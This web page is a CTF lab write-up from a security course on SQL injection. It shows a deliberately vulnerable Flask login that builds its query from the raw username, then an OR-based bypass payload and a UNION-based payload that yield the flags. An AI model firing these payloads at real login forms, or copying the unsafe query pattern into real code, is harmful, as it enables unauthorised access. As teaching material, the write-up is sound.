<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple Web 0x03(Lab - Log me in + Revenge)
  #


  tags: NTUSTWS CTF Web
  #

Challenge: http://h4ck3r.quest:8200/
Challenge: http://h4ck3r.quest:8201/

  Exploit - SQLi
  #


Payload → ') or ('1'='1') -- #
SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) or (&lsquo;1&rsquo;=&lsquo;1&rsquo;) &ndash; #&rsquo;) AND (password=&lsquo;MTIz&rsquo;)

Flag: FLAG{b4by_sql_inj3cti0n}

  Revenge source code
  #

:::spoiler code
from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/database.db')
        db.row_factory = sqlite3.Row
    return db


@app.before_first_request
def init_db():
    cursor = get_db().cursor()
    cursor.execute(&#34;&#34;&#34;
    CREATE TABLE IF NOT EXISTS &#34;admin&#34; (
        &#34;username&#34;  TEXT NOT NULL,
        &#34;password&#34;  TEXT NOT NULL
    )
    &#34;&#34;&#34;)
    cursor.execute(&#34;SELECT COUNT(*) as count FROM admin WHERE username='admin'&#34;)
    count = cursor.fetchone()['count']
    if count == 0:
        import secrets
        cursor.execute(&#34;INSERT INTO admin (username, password) VALUES (?,?)&#34;,
                       ('admin', secrets.token_urlsafe()))
    get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route(&#34;/&#34;)
def home():
    return render_template(&#34;index.html&#34;,
                           failed=request.args.get('failed') != None)


@app.route(&#34;/login&#34;, methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return redirect(&#34;/?failed&#34;)

    cur = get_db().execute(f&#34;SELECT * FROM admin WHERE (username='{username}')&#34;)
    res = cur.fetchone()
    cur.close()

    if res['username'] == 'admin' and res['password'] == password:
        return &#34;FLAG: FLAG{<REDACTED>}&#34;

    return redirect(&#34;/?failed&#34;)



@app.route(&#34;/source&#34;)
def source():
    import re
    source_code = open(__file__).read()
    source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{<REDACTED>}', source_code, 1)
    return Response(source_code, mimetype='text/plain')


if __name__ == '__main__':
    app.run(debug=True)
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x03(Lab - Log me in + Revenge)"><meta property="og:description" content="Simple Web 0x03(Lab - Log me in + Revenge) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8200/ Challenge: http://h4ck3r.quest:8201/
Exploit - SQLi # Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Flag: FLAG{b4by_sql_inj3cti0n}
Revenge source code # :::spoiler code
from flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/database.db') db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(&#34;&#34;&#34; CREATE TABLE IF NOT EXISTS &#34;admin&#34; ( &#34;username&#34; TEXT NOT NULL, &#34;password&#34; TEXT NOT NULL ) &#34;&#34;&#34;) cursor.execute(&#34;SELECT COUNT(*) as count FROM admin WHERE username='admin'&#34;) count = cursor.fetchone()['count'] if count == 0: import secrets cursor.execute(&#34;INSERT INTO admin (username, password) VALUES (?,?)&#34;, ('admin', secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() @app.route(&#34;/&#34;) def home(): return render_template(&#34;index.html&#34;, failed=request.args.get('failed') != None) @app.route(&#34;/login&#34;, methods=['POST']) def login(): username = request.form.get('username') password = request.form.get('password') if not username or not password: return redirect(&#34;/?failed&#34;) cur = get_db().execute(f&#34;SELECT * FROM admin WHERE (username='{username}')&#34;) res = cur.fetchone() cur.close() if res['username'] == 'admin' and res['password'] == password: return &#34;FLAG: FLAG{<REDACTED>}&#34; return redirect(&#34;/?failed&#34;) @app.route(&#34;/source&#34;) def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{<REDACTED>}', source_code, 1) return Response(source_code, mimetype='text/plain') if __name__ == '__main__': app.run(debug=True) :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTWS"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x03(Lab - Log me in + Revenge) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x03(Lab - Log me in + Revenge)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#exploit---sqli>Exploit - <code>SQLi</code></a></li><li><a href=#revenge-source-code>Revenge source code</a></li><li><a href=#exploit---sqli--union-syntax>Exploit - <code>SQLi</code> + union syntax</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x03lab---log-me-in--revenge>Simple Web 0x03(Lab - Log me in + Revenge)
<a class=anchor href=#simple-web-0x03lab---log-me-in--revenge>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8200/>http://h4ck3r.quest:8200/</a>
Challenge: <a href=http://h4ck3r.quest:8201/>http://h4ck3r.quest:8201/</a></p><h2 id=exploit---sqli>Exploit - <code>SQLi</code>
<a class=anchor href=#exploit---sqli>#</a></h2><ul><li>Payload → <code>') or ('1'='1') -- #</code>
SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) or (&lsquo;1&rsquo;=&lsquo;1&rsquo;) &ndash; #&rsquo;) AND (password=&lsquo;MTIz&rsquo;)</li></ul><p>Flag: <code>FLAG{b4by_sql_inj3cti0n}</code></p><h2 id=revenge-source-code>Revenge source code
<a class=anchor href=#revenge-source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
    db = getattr(g, &#39;_database&#39;, None)
    if db is None:
        db = g._database = sqlite3.connect(&#39;/tmp/database.db&#39;)
        db.row_factory = sqlite3.Row
    return db


@app.before_first_request
def init_db():
    cursor = get_db().cursor()
    cursor.execute(&#34;&#34;&#34;
    CREATE TABLE IF NOT EXISTS &#34;admin&#34; (
        &#34;username&#34;  TEXT NOT NULL,
        &#34;password&#34;  TEXT NOT NULL
    )
    &#34;&#34;&#34;)
    cursor.execute(&#34;SELECT COUNT(*) as count FROM admin WHERE username=&#39;admin&#39;&#34;)
    count = cursor.fetchone()[&#39;count&#39;]
    if count == 0:
        import secrets
        cursor.execute(&#34;INSERT INTO admin (username, password) VALUES (?,?)&#34;,
                       (&#39;admin&#39;, secrets.token_urlsafe()))
    get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, &#39;_database&#39;, None)
    if db is not None:
        db.close()


@app.route(&#34;/&#34;)
def home():
    return render_template(&#34;index.html&#34;,
                           failed=request.args.get(&#39;failed&#39;) != None)


@app.route(&#34;/login&#34;, methods=[&#39;POST&#39;])
def login():
    username = request.form.get(&#39;username&#39;)
    password = request.form.get(&#39;password&#39;)

    if not username or not password:
        return redirect(&#34;/?failed&#34;)

    cur = get_db().execute(f&#34;SELECT * FROM admin WHERE (username=&#39;{username}&#39;)&#34;)
    res = cur.fetchone()
    cur.close()

    if res[&#39;username&#39;] == &#39;admin&#39; and res[&#39;password&#39;] == password:
        return &#34;FLAG: FLAG{&lt;REDACTED&gt;}&#34;

    return redirect(&#34;/?failed&#34;)



@app.route(&#34;/source&#34;)
def source():
    import re
    source_code = open(__file__).read()
    source_code = re.sub(r&#39;FLAG{[^}\s]+}&#39;, &#39;FLAG{&lt;REDACTED&gt;}&#39;, source_code, 1)
    return Response(source_code, mimetype=&#39;text/plain&#39;)


if __name__ == &#39;__main__&#39;:
    app.run(debug=True)
</code></pre><p>:::</p><h2 id=exploit---sqli--union-syntax>Exploit - <code>SQLi</code> + union syntax
<a class=anchor href=#exploit---sqli--union-syntax>#</a></h2><ol><li>Observe source code first
It must receive username and password together, or failed otherwise. Thus, we can not use previous payload.</li><li>Union syntax
Username Payload → <code>') union select 'admin', 'password' -- #</code>
Password → <code>password</code>
<font color=FF000>SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) union select &lsquo;admin&rsquo;, &lsquo;password&rsquo; &ndash; #&rsquo;)</font></li></ol><p>Flag: <code>FLAG: FLAG{un10n_bas3d_sqli}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#exploit---sqli>Exploit - <code>SQLi</code></a></li><li><a href=#revenge-source-code>Revenge source code</a></li><li><a href=#exploit---sqli--union-syntax>Exploit - <code>SQLi</code> + union syntax</a></li></ul></nav></div></aside></main></body></html>